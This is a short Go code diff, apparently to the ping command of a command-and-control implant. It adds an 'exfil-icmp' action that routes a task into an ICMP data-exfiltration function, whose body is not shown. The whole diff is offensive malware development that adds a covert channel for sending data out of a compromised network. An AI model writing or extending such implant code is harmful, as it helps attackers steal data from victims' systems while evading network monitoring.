@@ -20,6 +20,7 @@ func (c *PingCommand) Description() string {
 }
 
 type pingArgs struct {
+	Action  string `json:"action"`  // Action: "" (ping, default) or "exfil-icmp"
 	Hosts   string `json:"hosts"`   // Single host, comma-separated, or CIDR (e.g., "192.168.1.0/24")
 	Port    int    `json:"port"`    // Port to connect to (default: 445)
 	Timeout int    `json:"timeout"` // Timeout per host in ms (default: 1000)
@@ -37,6 +38,16 @@ type pingResult struct {
 func (c *PingCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
 		return errorResult("Error: parameters required. Use -hosts <IP/CIDR/range> [-port 445] [-timeout 1000] [-threads 25]")
+	}
+
+	// Check for ICMP exfil action
+	var actionCheck struct {
+		Action string `json:"action"`
+	}
+	if err := json.Unmarshal([]byte(task.Params), &actionCheck); err == nil {
+		if actionCheck.Action == "exfil-icmp" {
+			return executeICMPExfil(task)
+		}
 	}
 
 	var args pingArgs
